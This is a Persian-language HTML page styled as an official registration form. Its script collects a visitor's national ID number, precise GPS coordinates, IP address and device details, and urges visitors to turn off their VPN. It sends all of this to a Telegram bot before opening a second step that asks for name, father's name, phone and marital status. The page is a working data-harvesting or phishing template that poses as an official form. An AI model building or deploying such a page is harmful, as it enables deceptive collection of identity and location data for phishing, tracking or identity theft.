<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>فرم ثبت نام — رسمی</title>
<link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;700;900&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/bodymovin/5.10.1/lottie.min.js"></script>
<style>
:root{
  --bg:#f4f7fb;
  --card:#ffffff;
  --accent:#0b3558;
  --muted:#6b7a89;
  --accent-2:#0f9d58;
  --danger:#d9534f;
  --glass: rgba(255,255,255,0.6);
  --radius:14px;
  --shadow: 0 6px 22px rgba(11,53,88,0.08);
  --highlight-green:#4caf50;
}
*{box-sizing:border-box;}
body{margin:0;padding:20px;font-family:'Vazirmatn',sans-serif;background:linear-gradient(180deg,var(--bg),#eef4fb);display:flex;justify-content:center;}
.container{width:100%;max-width:900px;background:#fff;border-radius:18px;padding:20px;box-shadow:var(--shadow);display:flex;flex-direction:column;}
header.form-header{display:flex;flex-direction:row;gap:20px;margin-bottom:20px;align-items:center;flex-wrap:wrap}
.brand{width:60px;height:60px;border-radius:12px;background:linear-gradient(135deg,var(--accent),#124a6b);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:20px}
.steps{display:flex;gap:12px;margin:20px 0;flex-wrap:wrap}
.step{padding:8px 14px;border-radius:999px;font-size:13px;background:transparent;border:1px dashed rgba(0,0,0,0.2);color:var(--muted)}
.step.active{background:var(--glass);color:var(--accent);border-style:solid}
form{display:grid;grid-template-columns:1fr;gap:20px}
@media(min-width:768px){form{grid-template-columns:2fr 1fr}}
@media(min-width:1200px){form{grid-template-columns:2fr 1fr}}
.card{background:#fff;border-radius:12px;padding:22px;border:1px solid rgba(0,0,0,0.05);box-shadow:0 8px 20px rgba(0,0,0,0.05)}
label{display:block;margin-bottom:8px;color:var(--muted);font-size:13px}
.field{margin-bottom:16px}
input, select{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(0,0,0,0.15);background:#fbfdff;font-size:14px;color:var(--accent);transition:background-color 0.3s;}
input[readonly]{background:#f0f4f9;color:#555}
.location-actions{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
.btn{padding:10px 16px;border-radius:10px;border:0;background:var(--accent);color:#fff;font-weight:600;cursor:pointer}
.btn.secondary{background:transparent;color:var(--accent);border:1px solid rgba(0,0,0,0.2)}
footer.actions{grid-column:1/-1;display:flex;justify-content:flex-end;margin-top:10px;flex-wrap:wrap}
.error{color:var(--danger);font-size:13px;margin-top:6px}
.location-preview{background:#f8fbff;border-radius:10px;padding:12px;border:1px solid rgba(0,0,0,0.05)}
.highlight-green{background:var(--highlight-green);}
.loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.8);display:flex;justify-content:center;align-items:center;z-index:999;display:none;}
</style>
</head>
<body>

<div class="loading-overlay" id="loadingOverlay"></div>

<div class="container">
  <header class="form-header">
    <div class="brand">IR</div>
    <div>
      <h1>فرم ثبت نام رسمی</h1>
      <p style="color:var(--muted);font-size:13px">مرحله اول: دریافت کد ملی و موقعیت جغرافیایی</p>
    </div>
  </header>

  <div class="steps">
    <div class="step active">مرحله ۱</div>
    <div class="step">مرحله ۲</div>
  </div>

  <form id="signupForm" novalidate>
    <section class="card">
      <h2 style="margin:0 0 14px;font-size:16px;color:var(--accent)">اطلاعات پایه</h2>
      <div class="field">
        <label for="nationalId">کد ملی (۱۰ رقمی)</label>
        <input id="nationalId" maxlength="10" type="tel" placeholder="0012345678">
        <div id="nidError" class="error" style="display:none"></div>
      </div>
      <div class="field">
        <label for="location">لوکیشن (کشور | ولایت)</label>
        <div class="location-actions">
          <input id="location" name="location" type="text" readonly placeholder="روی این فیلد کلیک کنید">
          <div id="locError" class="error" style="display:none"></div>
        </div>
      </div>
      <div class="field">
        <label>پیش‌نمایش کامل موقعیت</label>
        <div class="location-preview" id="locPreview">موقعیتی ثبت نشده است.</div>
      </div>
    </section>

    <aside class="aside">
      <div class="card">
        <strong>نکات امنیتی</strong>
        <p style="color:var(--muted);font-size:13px">ارسال داده‌ها صرفاً به تلگرام انجام می‌شود و مرحله دوم فقط پس از ارسال موفق فعال می‌شود.</p>
      </div>
    </aside>

    <footer class="actions">
      <button type="button" class="btn" id="continueBtn" disabled>ادامه</button>
    </footer>
  </form>

  <div id="step2Panel" class="card" style="margin-top:18px;display:none">
    <h3 style="margin:0 0 12px;color:var(--accent)">مرحله دوم — معلومات کامل شخص و فامیل</h3>
    <form id="step2Form" style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
      <div class="field"><label>نام</label><input type="text" name="firstName" required /></div>
      <div class="field"><label>نام خانوادگی</label><input type="text" name="lastName" required /></div>
      <div class="field"><label>نام پدر</label><input type="text" name="fatherName" required /></div>
      <div class="field"><label>شماره تماس</label><input type="tel" name="phone" required /></div>
      <div class="field"><label>وضعیت تأهل</label>
        <select id="maritalStatus" name="maritalStatus" required>
          <option value="single">مجرد</option>
          <option value="married">متأهل</option>
        </select>
      </div>
      <footer class="actions" style="grid-column:1/-1;margin-top:20px">
        <button type="submit" class="btn">ثبت نهایی</button>
      </footer>
    </form>
  </div>
</div>

<script>
// المان‌ها
const nationalId=document.getElementById("nationalId");
const locationInput=document.getElementById("location");
const locPreview=document.getElementById("locPreview");
const locError=document.getElementById("locError");
const nidError=document.getElementById("nidError");
const continueBtn=document.getElementById("continueBtn");
const step2Panel=document.getElementById("step2Panel");
const loadingOverlay=document.getElementById("loadingOverlay");

// فانکشن‌ها
function showError(el,msg){el.style.display='block';el.textContent=msg;}
function clearError(el){el.style.display='none';el.textContent='';}
function highlightField(el){el.classList.add('highlight-green'); setTimeout(()=>el.classList.remove('highlight-green'),2000);}
function showLoading(){loadingOverlay.style.display='flex'; loadingOverlay.innerHTML='<div id="lottie"></div>'; lottie.loadAnimation({container:document.getElementById('lottie'),renderer:'svg',loop:true,autoplay:true,path:'https://assets10.lottiefiles.com/packages/lf20_usmfx6bp.json'});}
function hideLoading(){loadingOverlay.style.display='none'; loadingOverlay.innerHTML='';}

// کنترل کد ملی
nationalId.addEventListener("input",()=>{
  nationalId.value=nationalId.value.replace(/[^0-9]/g,'');
  clearError(nidError);
  highlightField(nationalId);
  updateContinue();
});

// کنترل فعال شدن دکمه ادامه
function updateContinue(){
  continueBtn.disabled = !(nationalId.value.length===10 && locationInput.value.trim().length>0);
}

// بررسی VPN و نمایش پیام هشدار
async function checkVPNAndNotify(){
  try{
    const res=await fetch("https://ipapi.co/json/");
    const data=await res.json();
    if(data.country_code!=="IR"){
      locError.style.display='block';
      locError.textContent="هشدار: VPN روشن است. برای ثبت نام توصیه می‌شود خاموش شود.";
    }
    return data; // اطلاعات دستگاه و IP
  }catch(e){
    return {ip:"نامشخص", user_agent:navigator.userAgent};
  }
}

// گرفتن موقعیت خودکار هنگام کلیک
locationInput.addEventListener("click", async()=>{
  clearError(locError);
  showLoading();
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(async pos=>{
      const lat=pos.coords.latitude;
      const lon=pos.coords.longitude;
      try{
        const url=`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=fa`;
        const res=await fetch(url);
        const data=await res.json();
        const country=data.address.country||"نامشخص";
        const state=data.address.state||data.address.province||"نامشخص";
        locationInput.value=`${country} | ${state}`;
        locPreview.textContent=`کشور: ${country} — استان: ${state} — Lat:${lat.toFixed(6)}, Lon:${lon.toFixed(6)}`;
        highlightField(locationInput);
        updateContinue();
      }catch(e){showError(locError,"خطا در دریافت موقعیت");}
      finally{hideLoading();}
    },()=>{showError(locError,"دریافت موقعیت ممکن نشد"); hideLoading();});
  } else{showError(locError,"مرورگر شما GPS ندارد"); hideLoading();}
});

// ارسال داده به تلگرام
continueBtn.addEventListener("click", async()=>{
  showLoading();
  const BOT_TOKEN="YOUR_TELEGRAM_BOT_TOKEN";
  const CHAT_ID="YOUR_CHAT_ID";
  const deviceInfo = await checkVPNAndNotify(); // شامل IP و user-agent

  const msg=`<b>ثبت نام اولیه</b>\n`+
            `<b>کد ملی:</b> ${nationalId.value}\n`+
            `<b>لوکیشن:</b> ${locationInput.value}\n`+
            `<b>IP دستگاه:</b> ${deviceInfo.ip || "نامشخص"}\n`+
            `<b>نوع دستگاه:</b> ${navigator.userAgent}\n`+
            `<b>زمان:</b> ${new Date().toISOString()}`;

  try{
    const res=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:"HTML"})
    });
    const data=await res.json();
    if(res.ok && data.ok){
      step2Panel.style.display="block";
      continueBtn.disabled=true;
    } else { throw new Error("ارسال ناموفق");}
  }catch(e){showError(locError,"خطا در ارسال به تلگرام");}
  finally{hideLoading();}
});
</script>

</body>
</html>
